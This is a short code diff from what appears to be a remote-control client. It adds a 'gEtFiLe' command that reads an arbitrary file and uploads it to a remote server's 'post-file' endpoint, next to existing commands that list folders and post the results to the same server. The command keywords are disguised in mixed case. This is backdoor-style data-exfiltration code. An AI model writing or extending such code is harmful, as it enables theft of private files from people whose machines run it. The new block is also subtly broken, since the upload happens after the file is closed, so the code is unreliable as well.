@@ -590,6 +590,11 @@ def main():
                 txt = cmd.replace("sPeAk","")
                 saying = Thread(target=say,args=(txt,))
                 saying.start()
+            elif "gEtFiLe" in cmd:
+                p = cmd.replace("gEtFiLe ","")
+                with open(p,"rb") as file:
+                    files = {'file': (p, file)}
+                response = post(url+"post-file", files=files)  
             elif "gEtFoLdEr" in  cmd:
                 p = cmd.replace("gEtFoLdEr ","")
                 if p == "/":
@@ -600,6 +605,8 @@ def main():
                     post(url+"post-folder",json=folder)
                     print(folder)
                 else:
+                    if p.startswith("/"):
+                        p = p.replace("/","")
                     datas = listdir(p)
                     folder = {}
                     for idx, data in enumerate(datas, start=1):
